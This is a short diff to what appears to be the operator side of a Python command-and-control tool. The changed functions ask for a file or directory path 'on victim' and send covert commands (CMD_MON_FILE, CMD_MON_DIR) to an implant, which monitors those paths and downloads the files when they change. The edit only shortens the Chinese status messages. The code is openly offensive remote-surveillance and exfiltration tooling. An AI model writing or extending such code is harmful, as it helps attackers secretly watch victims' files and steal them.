@@ -347,7 +347,7 @@ def cmd_get_file(comm: Commander):
 
 def cmd_monitor_file(comm: Commander):
     file_path = input("Enter file path on victim to monitor: ").strip()
-    print(f"[Commander] 开始监控文件：{file_path}（仅在修改时触发下载）")
+    print(f"[Commander] 开始监控文件：{file_path}")
     comm.send_covert_message(f"CMD_MON_FILE:{file_path}".encode())
 
     try:
@@ -382,7 +382,7 @@ def cmd_monitor_file(comm: Commander):
 
 def cmd_monitor_dir(comm: Commander):
     dir_path = input("Enter directory path on victim to monitor: ").strip()
-    print(f"[Commander] 开始监控目录：{dir_path}（仅根目录；新增或修改时下载）")
+    print(f"[Commander] 开始监控目录：{dir_path}")
     # 启动监控
     comm.send_covert_message(f"CMD_MON_DIR:{dir_path}".encode())
 
